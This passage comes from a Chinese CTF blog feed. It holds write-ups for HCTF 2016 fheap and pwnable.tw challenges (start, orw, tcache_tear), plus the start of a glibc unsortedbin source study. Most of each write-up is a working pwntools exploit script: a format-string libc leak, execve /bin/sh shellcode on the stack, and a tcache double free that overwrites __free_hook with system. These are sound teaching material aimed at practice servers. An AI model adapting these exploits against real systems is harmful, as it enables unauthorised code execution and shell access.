database中查到多种结果，最后试得libc6_2.23-0ubuntu11_amd64才是正确版本。其实栈的前面还有很多其他的libc地址，但是本地和远程布局不太一样获取不到，所以找一个离程序起始比较近的地方去获取libc可能比较稳定。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29570</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn-f&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)  <span class="comment"># 正确的版本是libc6_2.23-0ubuntu11_amd64</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;create &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;str:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id is &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;delete &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sure?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params"><span class="built_in">breakpoint</span></span>):</span><br><span class="line">    gdb.attach(r, <span class="built_in">breakpoint</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;a&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;b&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;aaaa%176$pyyyy&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;c&#x27;</span>) + p8(<span class="number">0xB6</span>))  <span class="comment"># 0</span></span><br><span class="line">dbg(<span class="string">&#x27;b *printf&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">libc_start_main_ret_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;yyyy&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret_addr-<span class="number">0x20830</span>  <span class="comment"># 本地要-0x10</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span>  <span class="comment"># 本地要+0x10</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;sys_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 跳过delete函数</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;p&quot;</span>) + p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>似乎还有其他的打法，可以参考下面的链接</p><ul><li><a href="https://www.cnblogs.com/shangye/p/6156391.html">官方解法</a></li><li><a href="https://lantern.cool/wp-item-HCTF-2016-fheap/">Lantern师傅的解法</a></li><li><a href="https://blog.csdn.net/qq_33528164/article/details/79515831">比较详细的WP</a></li></ul>]]></content>
    
    
    <summary type="html">2016HCTF_fheap的其中一种解法和自己的理解</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>『pwnable』刷题记录_WP</title>
    <link href="https://c-lby.top/2024/03/05/pwnable-WP/"/>
    <id>https://c-lby.top/2024/03/05/pwnable-WP/</id>
    <published>2024-03-05T12:29:19.000Z</published>
    <updated>2024-03-28T08:22:40.914Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>pwnable的题挺好玩的，就是难度可能偏高，但是可以练基本功，知道自己的弱项在哪里，所以写WP来做刷题记录。</p><h3 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01 start"></a>0x01 start</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这篇WP在距离第一次做这题之后一个多月时间又修改了一次，不同的是，这段时间我学了一点汇编，才发现自己之前做题还是处于很懵懂的状态。其实这道题很有意思，程序是用汇编写的，短小精悍，32位无保护。IDA有点无助，如果不熟悉汇编，可以用动调来看发生了什么。从代码上来看，就是两次系统调用，然后就会退出。第一个系统调用显然是write，第二个IDA看不出来，但是从系统调用号（al寄存器处)可以看出来是read函数。</p><p><img src="https://c-lby.top/images/pwnable_wp/start_ida.png" alt="start_ida"></p><p>在准备write之前，程序总共push了6次，第一次是把esp中的地址放到了栈上，然后是_exit函数的地址，接下来连续push五次放的是字符串到栈上。我们知道，每push一次sp寄存器就会自动减一个字长。接下来程序把esp的地址作为起始地址然后打印20个字节，刚好对应五次push的内容。所以如果我们定义字符串最后一个字符的地址是buf，那么esp一开始的地址就是buf+0x1C。</p><p>打印完之后ecx中的内容没变，紧接着就read60个字节。也就是说程序从buf处开始输入60字节，有溢出，因为此时buf距离ret地址只有 0x14。注意，这里和平时我们常接触的C语言编译的程序不太一样，它没有ebp的存在（整个程序都没出现），所以那个offset _exit其实就是返回地址了。我们又知道，ret完后sp寄存器会自动加一个字长，所以ret完后sp寄存器刚好指向一开始写esp值的栈地址。显然这个地址也是个栈地址，所以我们可以控制执行流，让程序返回到0x8048087处更新ecx后打印，这样我们就泄露了栈地址了。</p><p>栈地址有什么用呢？整个程序很简单，也没有后门，也没有libc这一说，所以只能通过syscall来getshell，但是又没有足够的gadget来控制寄存器，所以考虑写shellcode。正好，程序没开NX保护。shellcode只能写到栈上，所以我们需要栈地址。上一步打印完后，程序直接从当前esp处开始输入。但是这里要注意，输入完之后程序依然会执行<code>add esp,14h</code>和<code>retn</code>，所以我们需要利用这个retn返回到shellcode处。所以输入的60字节就被这个ret地址切割成了20字节和36字节。我们很难找到少于20字节的shellcode，所以shellcode要写在24个字节之后。别忘了我们接收到的地址在当前esp的地址还要+4，所以我们要返回的地址是接收到的地址再+20就行了。</p><p>如果不确定我们接收到的地址到底是哪，可以动调看看，然后手算一下。</p><p><img src="https://c-lby.top/images/pwnable_wp/start_gdb.png" alt="start_gdb"></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./start&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;chall.pwnable.tw&quot;, 10000)</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch_gdb</span>():</span><br><span class="line">    context.terminal == [<span class="string">&#x27;xdce4-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb()</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(write_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">buf_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(buf_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02 orw"></a>0x02 orw</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p><img src="https://c-lby.top/images/pwnable_wp/orw_ida.png" alt="orw_ida"></p><p>程序十分简单，32位，就是开了一个沙盒，然后读取shellcode后执行。题目也已经提示了要用orw。我们直接用seccomp-tools查看沙盒都开了些什么。</p><p><img src="https://c-lby.top/images/pwnable_wp/orw_seccomp.png" alt="orw_seccomp"></p><p>开了些白名单，可以用这些函数，也就是说其他的用不了。程序中read函数可以输入200字节，所以直接使用pwntools的shellcraft工具来生成shellcode就行。&amp;shellcode位于bss段，我们读取的flag也可以存在bss段，注意不要和shellcode有冲突就行。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x804A060</span>+<span class="number">200</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># print(len(asm(shellcode))) #72</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-calc"><a href="#0x03-calc" class="headerlink" title="0x03 calc"></a>0x03 calc</h3><p>单独一篇文章分析</p><h3 id="0x21-tcache-tear"><a href="#0x21-tcache-tear" class="headerlink" title="0x21 tcache_tear"></a>0x21 tcache_tear</h3><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>题目名字就很明显提示了要用tcachebin attack，给了libc附件，用ROPgadget工具查了一下libc中binsh的偏移，用libcdata网站查出libc是2.27版本的。</p><p><img src="https://c-lby.top/images/pwnable_wp/tcache_tear_libc.png" alt="tcache_tear_libc"></p><p>说到tcache在2.27，我的第一反应就是double free没有任何检查，后面肯定用得上。然后程序一开始就要你往bss段写一个name，info函数也只是把这个name打印出来，肯定有些倪端，应该是要拿来泄露libc地址了。free功能限制了总共只能释放8个chunk，但是有UAF漏洞，为double free奠定了基础。malloc功能限制了大小为0xFF，并且可以写入的字节数为size-0x10，所以没有堆溢出。整个程序只有一个ptr变量用来储存上一个被申请的chunk的指针，所以一旦申请了新的chunk之后，之前申请的chunk就没法再被释放了。</p><p>所以总的思路就是，先泄露libc地址，然后通过double free劫持fd申请chunk到__free_hook，写入system地址后释放一个chunk来getshell，当然这个方式有个前提是在这之前的free不能超过7个；也可以劫持malloc_hook为one_gadget；看到程序当中有个exit本来想着劫持got表为one_gadget，但是看保护开了got表不可写（full relro），所以这个方案没法实现。</p><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>这道题不止一种泄露方法，这里先看一种，另外一种有时间再试试。其实这题不太好leak。如果有指针变量的话就可以通过got表来泄露，很可惜这里没有。堆题里另一种常见的泄露方式是通过unsorted bin的fd泄露，所以我们可以伪造一个fake chunk释放后进入unsorted bin来打印，显而易见这个chunk要在name处构造，size要在largebin范围，因为smallbin范围会先进入tcachebin。</p><p>释放chunk的时候libc会对chunk有一些检查，我们伪造chunk的话需要绕过这些检查。源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">   <span class="comment">/*这部分没有注释，但是一个chunk下面要么是另一个chunk要么是top chunk，所以检查一下很正常*/</span></span><br><span class="line"></span><br><span class="line">   free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>总而言之就是，libc会检查被释放的chunk的下一个chunk和下下个chunk的size字段，所以总的来说要伪造三个chunk，size字段分别为0x501,0x21,0x21就可以了。0x501在程序一开始就写入，下面两个size字段就需要通过double free申请到name+0x500处写入。这里要注意一个问题，我们可以同时写入下面两个chunk，总共需要写入<code>8*4*2</code>个字节，但是申请一个chunk的时候只能写入size-0x10个字节，所以我们double free的size至少要0x50。</p><p>然后第二次double free就申请到name+0x10处（tcachebin链表存的是mem地址），然后释放掉之后0x501size的chunk就会进入unsorted bin，然后fd就是一个和main_arena有固定偏移的地址，打印出来就可以计算出libc地址。</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>, p64(name_addr+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>, flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libc_address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span> </span><br><span class="line"><span class="comment"># 0x3ebca0 偏移可以通过2.27版本关键词在网上查到</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_address))</span><br></pre></td></tr></table></figure><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./tcache_tear&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10207</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tcache_tear&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaaaaaa&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>, p64(name_addr+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>, flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libc_address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x90</span>, p64(libc_address+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x90</span>, p64(libc_address+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pwnable.tw 持续更新</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>『glibc源码补完计划』UnsortedBin</title>
    <link href="https://c-lby.top/2024/03/02/glibc-unsortedbin/"/>
    <id>https://c-lby.top/2024/03/02/glibc-unsortedbin/</id>
    <published>2024-03-02T15:46:40.000Z</published>
    <updated>2024-03-04T05:23:23.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UnsortedBin"><a href="#UnsortedBin" class="headerlink" title="UnsortedBin"></a>UnsortedBin</h2><p>最近学习堆题的时候接触到了unsortedbin的利用，感觉还挺有意思的，所以先把它的源码读了，方便以后构建利用思路。之所以这里分析glibc2.23的代码而非2.35的代码，是因为从2.29开始，unsortedbin加入了一坨检查机制以至于它在高版本下难以被攻击，所以索性读低版本的了。</p><p>glibc2.23在unsortedbin中取chunk的时候的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)|| __builtin_expect (victim-&gt;size &gt; av&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>glibc2.29对unsortedbin链表完整性的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">       size = chunksize (victim);</span><br><span class="line">       mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid size 